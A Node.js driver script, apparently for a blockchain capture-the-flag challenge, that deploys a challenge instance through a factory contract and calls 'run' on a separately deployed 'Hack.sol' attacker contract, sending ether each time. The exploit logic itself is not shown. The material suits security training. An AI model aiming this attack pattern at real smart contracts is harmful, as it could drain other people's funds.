const fs = require('fs')
const lib = require('./lib')(require('./config'))

web3 = lib.web3

async function main () {
    let factory_address = '0x84Fb598A7E8d58715d3C5F2E789570D7B5B0e290'
    let factory = lib.contract(factory_address, JSON.parse(JSON.stringify([
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "token",
                    "type": "uint256"
                }
            ],
            "name": "GetFlag",
            "type": "event"
        },
        {
            "inputs": [],
            "name": "create",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "name": "instances",
            "outputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "token",
                    "type": "uint256"
                }
            ],
            "name": "validate",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ])))
    let hack_address = '0xe133f6c91f269584f89b2d56c0a17ebcd530e08d' // Hack.sol deployed address
    let hack = lib.contract(hack_address, JSON.parse(JSON.stringify([
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "_factory",
                    "type": "address"
                }
            ],
            "name": "create",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "_target",
                    "type": "address"
                }
            ],
            "name": "run",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "_factory",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "token",
                    "type": "uint256"
                }
            ],
            "name": "validate",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "stateMutability": "payable",
            "type": "receive"
        }
    ])))
    let instance_address = await factory.view('instances', hack_address)
    if (instance_address === '0x0000000000000000000000000000000000000000') {
        await hack.call({value: web3.utils.toWei('0.5', 'ether')}, 'create', factory_address)
        instance_address = await factory.view('instances', hack_address)
    }
    console.log(`instance = ${instance_address}`)
    await hack.call({value: web3.utils.toWei('0.5', 'ether')}, 'run', instance_address)
}

main()